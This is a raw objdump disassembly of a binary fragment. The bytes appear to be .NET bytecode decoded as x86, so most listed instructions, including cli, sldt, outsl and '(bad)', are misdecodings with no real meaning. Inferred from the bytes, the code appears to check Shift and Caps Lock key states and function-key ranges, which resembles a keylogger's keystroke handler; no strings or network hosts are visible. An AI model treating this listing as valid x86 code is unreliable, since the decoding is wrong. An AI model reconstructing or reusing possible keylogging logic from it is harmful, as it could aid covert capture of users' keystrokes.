  404cae:	0a 0b                	or     (%ebx),%cl
  404cb0:	28 27                	sub    %ah,(%edi)
  404cb2:	00 00                	add    %al,(%eax)
  404cb4:	0a de                	or     %dh,%bl
  404cb6:	00 7e f9             	add    %bh,-0x7(%esi)
  404cb9:	00 00                	add    %al,(%eax)
  404cbb:	0a 72 f5             	or     -0xb(%edx),%dh
  404cbe:	02 00                	add    (%eax),%al
  404cc0:	70 17                	jo     0x404cd9
  404cc2:	6f                   	outsl  %ds:(%esi),(%dx)
  404cc3:	3c 00                	cmp    $0x0,%al
  404cc5:	00 0a                	add    %cl,(%edx)
  404cc7:	0c 08                	or     $0x8,%al
  404cc9:	7e 0f                	jle    0x404cda
  404ccb:	00 00                	add    %al,(%eax)
  404ccd:	04 28                	add    $0x28,%al
  404ccf:	35 00 00 0a 16       	xor    $0x160a0000,%eax
  404cd4:	6f                   	outsl  %ds:(%esi),(%dx)
  404cd5:	fa                   	cli
  404cd6:	00 00                	add    %al,(%eax)
  404cd8:	0a de                	or     %dh,%bl
  404cda:	0e                   	push   %cs
  404cdb:	25 28 25 00 00       	and    $0x2528,%eax
  404ce0:	0a 0d 28 27 00 00    	or     0x2728,%cl
  404ce6:	0a de                	or     %dh,%bl
  404ce8:	00 73 4a             	add    %dh,0x4a(%ebx)
  404ceb:	00 00                	add    %al,(%eax)
  404ced:	0a 13                	or     (%ebx),%dl
  404cef:	0a 11                	or     (%ecx),%dl
  404cf1:	0a 72 5a             	or     0x5a(%edx),%dh
  404cf4:	0d 00 70 6f 4b       	or     $0x4b6f7000,%eax
  404cf9:	00 00                	add    %al,(%eax)
  404cfb:	0a 11                	or     (%ecx),%dl
  404cfd:	0a 72 6c             	or     0x6c(%edx),%dh
  404d00:	0d 00 70 7e 0f       	or     $0xf7e7000,%eax
  404d05:	00 00                	add    %al,(%eax)
  404d07:	04 28                	add    $0x28,%al
  404d09:	35 00 00 0a 72       	xor    $0x720a0000,%eax
  404d0e:	ad                   	lods   %ds:(%esi),%eax
  404d0f:	02 00                	add    (%eax),%al
  404d11:	70 28                	jo     0x404d3b
  404d13:	28 00                	sub    %al,(%eax)
  404d15:	00 0a                	add    %cl,(%edx)
  404d17:	6f                   	outsl  %ds:(%esi),(%dx)
  404d18:	37                   	aaa
  404d19:	00 00                	add    %al,(%eax)
  404d1b:	0a 11                	or     (%ecx),%dl
  404d1d:	0a 17                	or     (%edi),%dl
  404d1f:	6f                   	outsl  %ds:(%esi),(%dx)
  404d20:	33 00                	xor    (%eax),%eax
  404d22:	00 0a                	add    %cl,(%edx)
  404d24:	11 0a                	adc    %ecx,(%edx)
  404d26:	17                   	pop    %ss
  404d27:	6f                   	outsl  %ds:(%esi),(%dx)
  404d28:	fb                   	sti
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	0a 11                	or     (%ecx),%dl
  404d2d:	0a 28                	or     (%eax),%ch
  404d2f:	38 00                	cmp    %al,(%eax)
  404d31:	00 0a                	add    %cl,(%edx)
  404d33:	26 de 0f             	fimuls %es:(%edi)
  404d36:	25 28 25 00 00       	and    $0x2528,%eax
  404d3b:	0a 13                	or     (%ebx),%dl
  404d3d:	04 28                	add    $0x28,%al
  404d3f:	27                   	daa
  404d40:	00 00                	add    %al,(%eax)
  404d42:	0a de                	or     %dh,%bl
  404d44:	00 1d 28 3e 00 00    	add    %bl,0x3e28
  404d4a:	0a 72 23             	or     0x23(%edx),%dh
  404d4d:	02 00                	add    (%eax),%al
  404d4f:	70 7e                	jo     0x404dcf
  404d51:	0f 00 00             	sldt   (%eax)
  404d54:	04 28                	add    $0x28,%al
  404d56:	35 00 00 0a 72       	xor    $0x720a0000,%eax
  404d5b:	51                   	push   %ecx
  404d5c:	03 00                	add    (%eax),%eax
  404d5e:	70 28                	jo     0x404d88
  404d60:	3f                   	aas
  404d61:	00 00                	add    %al,(%eax)
  404d63:	0a 13                	or     (%ebx),%dl
  404d65:	05 11 05 28 2e       	add    $0x2e280511,%eax
  404d6a:	00 00                	add    %al,(%eax)
  404d6c:	0a 2c 11             	or     (%ecx,%edx,1),%ch
  404d6f:	7e 28                	jle    0x404d99
  404d71:	00 00                	add    %al,(%eax)
  404d73:	04 6f                	add    $0x6f,%al
  404d75:	ab                   	stos   %eax,%es:(%edi)
  404d76:	00 00                	add    %al,(%eax)
  404d78:	0a 11                	or     (%ecx),%dl
  404d7a:	05 28 f8 00 00       	add    $0xf828,%eax
  404d7f:	0a de                	or     %dh,%bl
  404d81:	0f 25                	(bad)
  404d83:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  404d89:	06                   	push   %es
  404d8a:	28 27                	sub    %ah,(%edi)
  404d8c:	00 00                	add    %al,(%eax)
  404d8e:	0a de                	or     %dh,%bl
  404d90:	00 28                	add    %ch,(%eax)
  404d92:	5d                   	pop    %ebp
  404d93:	00 00                	add    %al,(%eax)
  404d95:	06                   	push   %es
  404d96:	28 fc                	sub    %bh,%ah
  404d98:	00 00                	add    %al,(%eax)
  404d9a:	0a 72 90             	or     -0x70(%edx),%dh
  404d9d:	0d 00 70 28 1f       	or     $0x1f287000,%eax
  404da2:	00 00                	add    %al,(%eax)
  404da4:	0a 13                	or     (%ebx),%dl
  404da6:	07                   	pop    %es
  404da7:	11 07                	adc    %eax,(%edi)
  404da9:	73 fd                	jae    0x404da8
  404dab:	00 00                	add    %al,(%eax)
  404dad:	0a 13                	or     (%ebx),%dl
  404daf:	08 11                	or     %dl,(%ecx)
  404db1:	08 72 9a             	or     %dh,-0x66(%edx)
  404db4:	0d 00 70 6f fe       	or     $0xfe6f7000,%eax
  404db9:	00 00                	add    %al,(%eax)
  404dbb:	0a 11                	or     (%ecx),%dl
  404dbd:	08 72 ae             	or     %dh,-0x52(%edx)
  404dc0:	0d 00 70 6f fe       	or     $0xfe6f7000,%eax
  404dc5:	00 00                	add    %al,(%eax)
  404dc7:	0a 11                	or     (%ecx),%dl
  404dc9:	08 72 ce             	or     %dh,-0x32(%edx)
  404dcc:	0d 00 70 28 ff       	or     $0xff287000,%eax
  404dd1:	00 00                	add    %al,(%eax)
  404dd3:	0a 28                	or     (%eax),%ch
  404dd5:	1f                   	pop    %ds
  404dd6:	00 00                	add    %al,(%eax)
  404dd8:	0a 6f fe             	or     -0x2(%edi),%ch
  404ddb:	00 00                	add    %al,(%eax)
  404ddd:	0a 11                	or     (%ecx),%dl
  404ddf:	08 72 d6             	or     %dh,-0x2a(%edx)
  404de2:	0d 00 70 28 00       	or     $0x287000,%eax
  404de7:	01 00                	add    %eax,(%eax)
  404de9:	0a 28                	or     (%eax),%ch
  404deb:	4f                   	dec    %edi
  404dec:	00 00                	add    %al,(%eax)
  404dee:	0a 72 e2             	or     -0x1e(%edx),%dh
  404df1:	0d 00 70 28 28       	or     $0x28287000,%eax
  404df6:	00 00                	add    %al,(%eax)
  404df8:	0a 6f fe             	or     -0x2(%edi),%ch
  404dfb:	00 00                	add    %al,(%eax)
  404dfd:	0a 11                	or     (%ecx),%dl
  404dff:	08 72 ce             	or     %dh,-0x32(%edx)
  404e02:	0d 00 70 28 b6       	or     $0xb6287000,%eax
  404e07:	00 00                	add    %al,(%eax)
  404e09:	0a 28                	or     (%eax),%ch
  404e0b:	1f                   	pop    %ds
  404e0c:	00 00                	add    %al,(%eax)
  404e0e:	0a 6f fe             	or     -0x2(%edi),%ch
  404e11:	00 00                	add    %al,(%eax)
  404e13:	0a 11                	or     (%ecx),%dl
  404e15:	08 72 d6             	or     %dh,-0x2a(%edx)
  404e18:	0d 00 70 11 07       	or     $0x7117000,%eax
  404e1d:	28 4f 00             	sub    %cl,0x0(%edi)
  404e20:	00 0a                	add    %cl,(%edx)
  404e22:	72 e2                	jb     0x404e06
  404e24:	0d 00 70 28 28       	or     $0x28287000,%eax
  404e29:	00 00                	add    %al,(%eax)
  404e2b:	0a 6f fe             	or     -0x2(%edi),%ch
  404e2e:	00 00                	add    %al,(%eax)
  404e30:	0a de                	or     %dh,%bl
  404e32:	0c 11                	or     $0x11,%al
  404e34:	08 2c 07             	or     %ch,(%edi,%eax,1)
  404e37:	11 08                	adc    %ecx,(%eax)
  404e39:	6f                   	outsl  %ds:(%esi),(%dx)
  404e3a:	5e                   	pop    %esi
  404e3b:	00 00                	add    %al,(%eax)
  404e3d:	0a dc                	or     %ah,%bl
  404e3f:	02 2c 15 03 28 b9 00 	add    0xb92803(,%edx,1),%ch
  404e46:	00 0a                	add    %cl,(%edx)
  404e48:	26 de 0c 28          	fimuls %es:(%eax,%ebp,1)
  404e4c:	25 00 00 0a 28       	and    $0x280a0000,%eax
  404e51:	27                   	daa
  404e52:	00 00                	add    %al,(%eax)
  404e54:	0a de                	or     %dh,%bl
  404e56:	00 73 4a             	add    %dh,0x4a(%ebx)
  404e59:	00 00                	add    %al,(%eax)
  404e5b:	0a 13                	or     (%ebx),%dl
  404e5d:	0a 11                	or     (%ecx),%dl
  404e5f:	0a 11                	or     (%ecx),%dl
  404e61:	07                   	pop    %es
  404e62:	6f                   	outsl  %ds:(%esi),(%dx)
  404e63:	4b                   	dec    %ebx
  404e64:	00 00                	add    %al,(%eax)
  404e66:	0a 11                	or     (%ecx),%dl
  404e68:	0a 17                	or     (%edi),%dl
  404e6a:	6f                   	outsl  %ds:(%esi),(%dx)
  404e6b:	fb                   	sti
  404e6c:	00 00                	add    %al,(%eax)
  404e6e:	0a 11                	or     (%ecx),%dl
  404e70:	0a 16                	or     (%esi),%dl
  404e72:	6f                   	outsl  %ds:(%esi),(%dx)
  404e73:	01 01                	add    %eax,(%ecx)
  404e75:	00 0a                	add    %cl,(%edx)
  404e77:	11 0a                	adc    %ecx,(%edx)
  404e79:	16                   	push   %ss
  404e7a:	6f                   	outsl  %ds:(%esi),(%dx)
  404e7b:	02 01                	add    (%ecx),%al
  404e7d:	00 0a                	add    %cl,(%edx)
  404e7f:	11 0a                	adc    %ecx,(%edx)
  404e81:	17                   	pop    %ss
  404e82:	6f                   	outsl  %ds:(%esi),(%dx)
  404e83:	33 00                	xor    (%eax),%eax
  404e85:	00 0a                	add    %cl,(%edx)
  404e87:	11 0a                	adc    %ecx,(%edx)
  404e89:	28 38                	sub    %bh,(%eax)
  404e8b:	00 00                	add    %al,(%eax)
  404e8d:	0a 26                	or     (%esi),%ah
  404e8f:	16                   	push   %ss
  404e90:	28 26                	sub    %ah,(%esi)
  404e92:	00 00                	add    %al,(%eax)
  404e94:	0a de                	or     %dh,%bl
  404e96:	0f 25                	(bad)
  404e98:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  404e9e:	09 28                	or     %ebp,(%eax)
  404ea0:	27                   	daa
  404ea1:	00 00                	add    %al,(%eax)
  404ea3:	0a de                	or     %dh,%bl
  404ea5:	00 2a                	add    %ch,(%edx)
  404ea7:	00 41 c4             	add    %al,-0x3c(%ecx)
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	00 00                	add    %al,(%eax)
  404eae:	00 00                	add    %al,(%eax)
  404eb0:	03 00                	add    (%eax),%eax
  404eb2:	00 00                	add    %al,(%eax)
  404eb4:	21 00                	and    %eax,(%eax)
  404eb6:	00 00                	add    %al,(%eax)
  404eb8:	24 00                	and    $0x0,%al
  404eba:	00 00                	add    %al,(%eax)
  404ebc:	0e                   	push   %cs
  404ebd:	00 00                	add    %al,(%eax)
  404ebf:	00 29                	add    %ch,(%ecx)
  404ec1:	00 00                	add    %al,(%eax)
  404ec3:	01 00                	add    %eax,(%eax)
  404ec5:	00 00                	add    %al,(%eax)
  404ec7:	00 32                	add    %dh,(%edx)
  404ec9:	00 00                	add    %al,(%eax)
  404ecb:	00 1b                	add    %bl,(%ebx)
  404ecd:	00 00                	add    %al,(%eax)
  404ecf:	00 4d 00             	add    %cl,0x0(%ebp)
  404ed2:	00 00                	add    %al,(%eax)
  404ed4:	0e                   	push   %cs
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	00 29                	add    %ch,(%ecx)
  404ed9:	00 00                	add    %al,(%eax)
  404edb:	01 00                	add    %eax,(%eax)
  404edd:	00 00                	add    %al,(%eax)
  404edf:	00 5b 00             	add    %bl,0x0(%ebx)
  404ee2:	00 00                	add    %al,(%eax)
  404ee4:	24 00                	and    $0x0,%al
  404ee6:	00 00                	add    %al,(%eax)
  404ee8:	7f 00                	jg     0x404eea
  404eea:	00 00                	add    %al,(%eax)
  404eec:	0e                   	push   %cs
  404eed:	00 00                	add    %al,(%eax)
  404eef:	00 29                	add    %ch,(%ecx)
  404ef1:	00 00                	add    %al,(%eax)
  404ef3:	01 00                	add    %eax,(%eax)
  404ef5:	00 00                	add    %al,(%eax)
  404ef7:	00 8d 00 00 00 4d    	add    %cl,0x4d000000(%ebp)
  404efd:	00 00                	add    %al,(%eax)
  404eff:	00 da                	add    %bl,%dl
  404f01:	00 00                	add    %al,(%eax)
  404f03:	00 0f                	add    %cl,(%edi)
  404f05:	00 00                	add    %al,(%eax)
  404f07:	00 29                	add    %ch,(%ecx)
  404f09:	00 00                	add    %al,(%eax)
  404f0b:	01 00                	add    %eax,(%eax)
  404f0d:	00 00                	add    %al,(%eax)
  404f0f:	00 e9                	add    %ch,%cl
  404f11:	00 00                	add    %al,(%eax)
  404f13:	00 3d 00 00 00 26    	add    %bh,0x26000000
  404f19:	01 00                	add    %eax,(%eax)
  404f1b:	00 0f                	add    %cl,(%edi)
  404f1d:	00 00                	add    %al,(%eax)
  404f1f:	00 29                	add    %ch,(%ecx)
  404f21:	00 00                	add    %al,(%eax)
  404f23:	01 02                	add    %eax,(%edx)
  404f25:	00 00                	add    %al,(%eax)
  404f27:	00 54 01 00          	add    %dl,0x0(%ecx,%eax,1)
  404f2b:	00 83 00 00 00 d7    	add    %al,-0x29000000(%ebx)
  404f31:	01 00                	add    %eax,(%eax)
  404f33:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  404f3e:	00 00                	add    %al,(%eax)
  404f40:	e6 01                	out    %al,$0x1
  404f42:	00 00                	add    %al,(%eax)
  404f44:	09 00                	or     %eax,(%eax)
  404f46:	00 00                	add    %al,(%eax)
  404f48:	ef                   	out    %eax,(%dx)
  404f49:	01 00                	add    %eax,(%eax)
  404f4b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404f4e:	00 00                	add    %al,(%eax)
  404f50:	29 00                	sub    %eax,(%eax)
  404f52:	00 01                	add    %al,(%ecx)
  404f54:	00 00                	add    %al,(%eax)
  404f56:	00 00                	add    %al,(%eax)
  404f58:	3a 01                	cmp    (%ecx),%al
  404f5a:	00 00                	add    %al,(%eax)
  404f5c:	01 01                	add    %eax,(%ecx)
  404f5e:	00 00                	add    %al,(%eax)
  404f60:	3b 02                	cmp    (%edx),%eax
  404f62:	00 00                	add    %al,(%eax)
  404f64:	0f 00 00             	sldt   (%eax)
  404f67:	00 29                	add    %ch,(%ecx)
  404f69:	00 00                	add    %al,(%eax)
  404f6b:	01 8e 14 fe 06 4b    	add    %ecx,0x4b06fe14(%esi)
  404f71:	00 00                	add    %al,(%eax)
  404f73:	06                   	push   %es
  404f74:	73 78                	jae    0x404fee
  404f76:	00 00                	add    %al,(%eax)
  404f78:	06                   	push   %es
  404f79:	80 24 00 00          	andb   $0x0,(%eax,%eax,1)
  404f7d:	04 7e                	add    $0x7e,%al
  404f7f:	03 01                	add    (%ecx),%eax
  404f81:	00 0a                	add    %cl,(%edx)
  404f83:	80 25 00 00 04 1f 0d 	andb   $0xd,0x1f040000
  404f8a:	80 26 00             	andb   $0x0,(%esi)
  404f8d:	00 04 2a             	add    %al,(%edx,%ebp,1)
  404f90:	1e                   	push   %ds
  404f91:	02 28                	add    (%eax),%ch
  404f93:	17                   	pop    %ss
  404f94:	00 00                	add    %al,(%eax)
  404f96:	0a 2a                	or     (%edx),%ch
  404f98:	56                   	push   %esi
  404f99:	7e 24                	jle    0x404fbf
  404f9b:	00 00                	add    %al,(%eax)
  404f9d:	04 28                	add    $0x28,%al
  404f9f:	4a                   	dec    %edx
  404fa0:	00 00                	add    %al,(%eax)
  404fa2:	06                   	push   %es
  404fa3:	80 25 00 00 04 28 04 	andb   $0x4,0x28040000
  404faa:	01 00                	add    %eax,(%eax)
  404fac:	0a 2a                	or     (%edx),%ch
  404fae:	00 00                	add    %al,(%eax)
  404fb0:	1b 30                	sbb    (%eax),%esi
  404fb2:	04 00                	add    $0x0,%al
  404fb4:	2e 00 00             	add    %al,%cs:(%eax)
  404fb7:	00 2f                	add    %ch,(%edi)
  404fb9:	00 00                	add    %al,(%eax)
  404fbb:	11 28                	adc    %ebp,(%eax)
  404fbd:	4c                   	dec    %esp
  404fbe:	00 00                	add    %al,(%eax)
  404fc0:	0a 0b                	or     (%ebx),%cl
  404fc2:	7e 26                	jle    0x404fea
  404fc4:	00 00                	add    %al,(%eax)
  404fc6:	04 02                	add    $0x2,%al
  404fc8:	07                   	pop    %es
  404fc9:	6f                   	outsl  %ds:(%esi),(%dx)
  404fca:	05 01 00 0a 28       	add    $0x280a0001,%eax
  404fcf:	51                   	push   %ecx
  404fd0:	00 00                	add    %al,(%eax)
  404fd2:	06                   	push   %es
  404fd3:	16                   	push   %ss
  404fd4:	28 4e 00             	sub    %cl,0x0(%esi)
  404fd7:	00 06                	add    %al,(%esi)
  404fd9:	0a de                	or     %dh,%bl
  404fdb:	0c de                	or     $0xde,%al
  404fdd:	0a 07                	or     (%edi),%al
  404fdf:	2c 06                	sub    $0x6,%al
  404fe1:	07                   	pop    %es
  404fe2:	6f                   	outsl  %ds:(%esi),(%dx)
  404fe3:	5e                   	pop    %esi
  404fe4:	00 00                	add    %al,(%eax)
  404fe6:	0a dc                	or     %ah,%bl
  404fe8:	06                   	push   %es
  404fe9:	2a 00                	sub    (%eax),%al
  404feb:	00 01                	add    %al,(%ecx)
  404fed:	10 00                	adc    %al,(%eax)
  404fef:	00 02                	add    %al,(%edx)
  404ff1:	00 06                	add    %al,(%esi)
  404ff3:	00 1c 22             	add    %bl,(%edx,%eiz,1)
  404ff6:	00 0a                	add    %cl,(%edx)
  404ff8:	00 00                	add    %al,(%eax)
  404ffa:	00 00                	add    %al,(%eax)
  404ffc:	1b 30                	sbb    (%eax),%esi
  404ffe:	07                   	pop    %es
  404fff:	00 d9                	add    %bl,%cl
  405001:	02 00                	add    (%eax),%al
  405003:	00 30                	add    %dh,(%eax)
  405005:	00 00                	add    %al,(%eax)
  405007:	11 02                	adc    %eax,(%edx)
  405009:	16                   	push   %ss
  40500a:	3f                   	aas
  40500b:	c0 02 00             	rolb   $0x0,(%edx)
  40500e:	00 03                	add    %al,(%ebx)
  405010:	20 00                	and    %al,(%eax)
  405012:	01 00                	add    %eax,(%eax)
  405014:	00 28                	add    %ch,(%eax)
  405016:	06                   	push   %es
  405017:	01 00                	add    %eax,(%eax)
  405019:	0a 28                	or     (%eax),%ch
  40501b:	07                   	pop    %es
  40501c:	01 00                	add    %eax,(%eax)
  40501e:	0a 39                	or     (%ecx),%bh
  405020:	ab                   	stos   %eax,%es:(%edi)
  405021:	02 00                	add    (%eax),%al
  405023:	00 04 28             	add    %al,(%eax,%ebp,1)
  405026:	08 01                	or     %al,(%ecx)
  405028:	00 0a                	add    %cl,(%edx)
  40502a:	8c 7d 00             	mov    %?,0x0(%ebp)
  40502d:	00 01                	add    %al,(%ecx)
  40502f:	13 04 1f             	adc    (%edi,%ebx,1),%eax
  405032:	14 28                	adc    $0x28,%al
  405034:	54                   	push   %esp
  405035:	00 00                	add    %al,(%eax)
  405037:	06                   	push   %es
  405038:	20 ff                	and    %bh,%bh
  40503a:	ff 00                	incl   (%eax)
  40503c:	00 5f 16             	add    %bl,0x16(%edi)
  40503f:	fe 01                	incb   (%ecx)
  405041:	16                   	push   %ss
  405042:	fe 01                	incb   (%ecx)
  405044:	8c 38                	mov    %?,(%eax)
  405046:	00 00                	add    %al,(%eax)
  405048:	01 0b                	add    %ecx,(%ebx)
  40504a:	20 a0 00 00 00 28    	and    %ah,0x28000000(%eax)
  405050:	54                   	push   %esp
  405051:	00 00                	add    %al,(%eax)
  405053:	06                   	push   %es
  405054:	20 00                	and    %al,(%eax)
  405056:	80 00 00             	addb   $0x0,(%eax)
  405059:	5f                   	pop    %edi
  40505a:	16                   	push   %ss
  40505b:	33 16                	xor    (%esi),%edx
  40505d:	20 a1 00 00 00 28    	and    %ah,0x28000000(%ecx)
  405063:	54                   	push   %esp
  405064:	00 00                	add    %al,(%eax)
  405066:	06                   	push   %es
  405067:	20 00                	and    %al,(%eax)
  405069:	80 00 00             	addb   $0x0,(%eax)
  40506c:	5f                   	pop    %edi
  40506d:	16                   	push   %ss
  40506e:	33 03                	xor    (%ebx),%eax
  405070:	16                   	push   %ss
  405071:	2b 01                	sub    (%ecx),%eax
  405073:	17                   	pop    %ss
  405074:	8c 38                	mov    %?,(%eax)
  405076:	00 00                	add    %al,(%eax)
  405078:	01 0d 11 04 28 09    	add    %ecx,0x9280411
  40507e:	01 00                	add    %eax,(%eax)
  405080:	0a 28                	or     (%eax),%ch
  405082:	4c                   	dec    %esp
  405083:	00 00                	add    %al,(%eax)
  405085:	06                   	push   %es
  405086:	0c 07                	or     $0x7,%al
  405088:	28 0a                	sub    %cl,(%edx)
  40508a:	01 00                	add    %eax,(%eax)
  40508c:	0a 2d 10 09 28 0a    	or     0xa280910,%ch
  405092:	01 00                	add    %eax,(%eax)
  405094:	0a 2d 08 16 8c 38    	or     0x388c1608,%ch
  40509a:	00 00                	add    %al,(%eax)
  40509c:	01 2b                	add    %ebp,(%ebx)
  40509e:	06                   	push   %es
  40509f:	17                   	pop    %ss
  4050a0:	8c 38                	mov    %?,(%eax)
  4050a2:	00 00                	add    %al,(%eax)
  4050a4:	01 28                	add    %ebp,(%eax)
  4050a6:	0a 01                	or     (%ecx),%al
  4050a8:	00 0a                	add    %cl,(%edx)
  4050aa:	2c 1d                	sub    $0x1d,%al
  4050ac:	08 14 72             	or     %dl,(%edx,%esi,2)
  4050af:	f2 0d 00 70 16 8d    	repnz or $0x8d167000,%eax
  4050b5:	03 00                	add    (%eax),%eax
  4050b7:	00 01                	add    %al,(%ecx)
  4050b9:	14 14                	adc    $0x14,%al
  4050bb:	14 28                	adc    $0x28,%al
  4050bd:	41                   	inc    %ecx
  4050be:	00 00                	add    %al,(%eax)
  4050c0:	0a 28                	or     (%eax),%ch
  4050c2:	11 00                	adc    %eax,(%eax)
  4050c4:	00 0a                	add    %cl,(%edx)
  4050c6:	0c 2b                	or     $0x2b,%al
  4050c8:	1b 08                	sbb    (%eax),%ecx
  4050ca:	14 72                	adc    $0x72,%al
  4050cc:	cf                   	iret
  4050cd:	0b 00                	or     (%eax),%eax
  4050cf:	70 16                	jo     0x4050e7
  4050d1:	8d 03                	lea    (%ebx),%eax
  4050d3:	00 00                	add    %al,(%eax)
  4050d5:	01 14 14             	add    %edx,(%esp,%edx,1)
  4050d8:	14 28                	adc    $0x28,%al
  4050da:	41                   	inc    %ecx
  4050db:	00 00                	add    %al,(%eax)
  4050dd:	0a 28                	or     (%eax),%ch
  4050df:	11 00                	adc    %eax,(%eax)
  4050e1:	00 0a                	add    %cl,(%edx)
  4050e3:	0c 11                	or     $0x11,%al
  4050e5:	04 28                	add    $0x28,%al
  4050e7:	0b 01                	or     (%ecx),%eax
  4050e9:	00 0a                	add    %cl,(%edx)
  4050eb:	1f                   	pop    %ds
  4050ec:	70 32                	jo     0x405120
  4050ee:	2f                   	das
  4050ef:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  4050f2:	0b 01                	or     (%ecx),%eax
  4050f4:	00 0a                	add    %cl,(%edx)
  4050f6:	20 87 00 00 00 30    	and    %al,0x30000000(%edi)
  4050fc:	21 72 02             	and    %esi,0x2(%edx)
  4050ff:	0e                   	push   %cs
  405100:	00 70 11             	add    %dh,0x11(%eax)
  405103:	04 28                	add    $0x28,%al
  405105:	0b 01                	or     (%ecx),%eax
  405107:	00 0a                	add    %cl,(%edx)
  405109:	28 a5 00 00 0a 72    	sub    %ah,0x720a0000(%ebp)
  40510f:	ed                   	in     (%dx),%eax
  405110:	0b 00                	or     (%eax),%eax
  405112:	70 28                	jo     0x40513c
  405114:	28 00                	sub    %al,(%eax)
  405116:	00 0a                	add    %cl,(%edx)
  405118:	0c 38                	or     $0x38,%al
  40511a:	42                   	inc    %edx
  40511b:	01 00                	add    %eax,(%eax)
  40511d:	00 11                	add    %dl,(%ecx)
  40511f:	04 28                	add    $0x28,%al
  405121:	0b 01                	or     (%ecx),%eax
  405123:	00 0a                	add    %cl,(%edx)
  405125:	8c 90 00 00 01 6f    	mov    %ss,0x6f010000(%eax)
  40512b:	0c 01                	or     $0x1,%al
  40512d:	00 0a                	add    %cl,(%edx)
  40512f:	13 06                	adc    (%esi),%eax
  405131:	11 06                	adc    %eax,(%esi)
  405133:	72 06                	jb     0x40513b
  405135:	0e                   	push   %cs
  405136:	00 70 16             	add    %dh,0x16(%eax)
  405139:	28 5b 00             	sub    %bl,0x0(%ebx)
  40513c:	00 0a                	add    %cl,(%edx)
  40513e:	16                   	push   %ss
  40513f:	33 0b                	xor    (%ebx),%ecx
  405141:	72 12                	jb     0x405155
  405143:	0e                   	push   %cs
  405144:	00 70 0c             	add    %dh,0xc(%eax)
  405147:	38 14 01             	cmp    %dl,(%ecx,%eax,1)
  40514a:	00 00                	add    %al,(%eax)
  40514c:	11 06                	adc    %eax,(%esi)
  40514e:	72 22                	jb     0x405172
  405150:	0e                   	push   %cs
  405151:	00 70 16             	add    %dh,0x16(%eax)
  405154:	28 5b 00             	sub    %bl,0x0(%ebx)
  405157:	00 0a                	add    %cl,(%edx)
  405159:	16                   	push   %ss
  40515a:	33 0b                	xor    (%ebx),%ecx
  40515c:	72 30                	jb     0x40518e
  40515e:	0e                   	push   %cs
  40515f:	00 70 0c             	add    %dh,0xc(%eax)
  405162:	38 f9                	cmp    %bh,%cl
  405164:	00 00                	add    %al,(%eax)
  405166:	00 11                	add    %dl,(%ecx)
  405168:	06                   	push   %es
  405169:	72 40                	jb     0x4051ab
  40516b:	0e                   	push   %cs
  40516c:	00 70 16             	add    %dh,0x16(%eax)
  40516f:	28 5b 00             	sub    %bl,0x0(%ebx)
  405172:	00 0a                	add    %cl,(%edx)
  405174:	16                   	push   %ss
  405175:	33 0b                	xor    (%ebx),%ecx
  405177:	72 4e                	jb     0x4051c7
  405179:	0e                   	push   %cs
  40517a:	00 70 0c             	add    %dh,0xc(%eax)
  40517d:	38 de                	cmp    %bl,%dh
  40517f:	00 00                	add    %al,(%eax)
  405181:	00 11                	add    %dl,(%ecx)
  405183:	06                   	push   %es
  405184:	72 5a                	jb     0x4051e0
  405186:	0e                   	push   %cs
  405187:	00 70 16             	add    %dh,0x16(%eax)
  40518a:	28 5b 00             	sub    %bl,0x0(%ebx)
  40518d:	00 0a                	add    %cl,(%edx)
  40518f:	16                   	push   %ss
  405190:	33 0b                	xor    (%ebx),%ecx
  405192:	72 72                	jb     0x405206
  405194:	0e                   	push   %cs
  405195:	00 70 0c             	add    %dh,0xc(%eax)
  405198:	38 c3                	cmp    %al,%bl
  40519a:	00 00                	add    %al,(%eax)
  40519c:	00 11                	add    %dl,(%ecx)
  40519e:	06                   	push   %es
  40519f:	72 80                	jb     0x405121
  4051a1:	0e                   	push   %cs
  4051a2:	00 70 16             	add    %dh,0x16(%eax)
  4051a5:	28 5b 00             	sub    %bl,0x0(%ebx)
  4051a8:	00 0a                	add    %cl,(%edx)
  4051aa:	16                   	push   %ss
  4051ab:	33 0b                	xor    (%ebx),%ecx
  4051ad:	72 72                	jb     0x405221
  4051af:	0e                   	push   %cs
  4051b0:	00 70 0c             	add    %dh,0xc(%eax)
  4051b3:	38 a8 00 00 00 11    	cmp    %ch,0x11000000(%eax)
  4051b9:	06                   	push   %es
  4051ba:	72 98                	jb     0x405154
  4051bc:	0e                   	push   %cs
  4051bd:	00 70 16             	add    %dh,0x16(%eax)
  4051c0:	28 5b 00             	sub    %bl,0x0(%ebx)
  4051c3:	00 0a                	add    %cl,(%edx)
  4051c5:	16                   	push   %ss
  4051c6:	33 0b                	xor    (%ebx),%ecx
  4051c8:	72 ac                	jb     0x405176
  4051ca:	0e                   	push   %cs
  4051cb:	00 70 0c             	add    %dh,0xc(%eax)
  4051ce:	38 8d 00 00 00 11    	cmp    %cl,0x11000000(%ebp)
  4051d4:	06                   	push   %es
  4051d5:	72 bc                	jb     0x405193
  4051d7:	0e                   	push   %cs
  4051d8:	00 70 16             	add    %dh,0x16(%eax)
  4051db:	28 5b 00             	sub    %bl,0x0(%ebx)
  4051de:	00 0a                	add    %cl,(%edx)
  4051e0:	16                   	push   %ss
  4051e1:	33 08                	xor    (%eax),%ecx
  4051e3:	72 ac                	jb     0x405191
  4051e5:	0e                   	push   %cs
  4051e6:	00 70 0c             	add    %dh,0xc(%eax)
  4051e9:	2b 75 11             	sub    0x11(%ebp),%esi
  4051ec:	06                   	push   %es
  4051ed:	72 d0                	jb     0x4051bf
  4051ef:	0e                   	push   %cs
  4051f0:	00 70 16             	add    %dh,0x16(%eax)
  4051f3:	28 5b 00             	sub    %bl,0x0(%ebx)
  4051f6:	00 0a                	add    %cl,(%edx)
  4051f8:	16                   	push   %ss
  4051f9:	33 08                	xor    (%eax),%ecx
  4051fb:	72 da                	jb     0x4051d7
  4051fd:	0e                   	push   %cs
  4051fe:	00 70 0c             	add    %dh,0xc(%eax)
  405201:	2b 5d 11             	sub    0x11(%ebp),%ebx
  405204:	06                   	push   %es
  405205:	72 e8                	jb     0x4051ef
  405207:	0e                   	push   %cs
  405208:	00 70 16             	add    %dh,0x16(%eax)
  40520b:	28 5b 00             	sub    %bl,0x0(%ebx)
  40520e:	00 0a                	add    %cl,(%edx)
  405210:	16                   	push   %ss
  405211:	33 08                	xor    (%eax),%ecx
